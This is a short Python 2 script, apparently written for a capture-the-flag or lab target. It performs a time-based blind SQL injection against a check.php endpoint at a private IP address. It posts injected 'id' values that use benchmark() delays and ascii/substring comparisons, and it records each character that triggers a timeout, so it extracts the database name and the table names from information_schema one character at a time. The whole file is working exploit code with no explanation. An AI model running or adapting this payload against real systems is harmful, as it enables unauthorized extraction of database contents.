import requests
import time
sql=''''or ascii(substring(database(),{},1))=ascii('{}') and benchmark(10000000,md5(1)) and'1'='1'''
sql2=''''or ascii(substring((select group_concat(table_name) from information_schema.tables where table_schema=database() ),{},1))=ascii('{}') and benchmark(100000000,md5(1)) and'1'='1'''
payload=''
url='http://10.21.13.153:20001/check.php'
payloads="1234657980QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm{}!@$%^"
for y in xrange(1,32):
    for x in payloads:
        data={'id':sql2.format(str(y),x)}
        try:
            print data['id']
            time.sleep(0.5)
            re = requests.post(url=url,data=data,timeout=2)
        except requests.exceptions.ReadTimeout:
            payload+=x
            print payload
            break;
    print "***********"

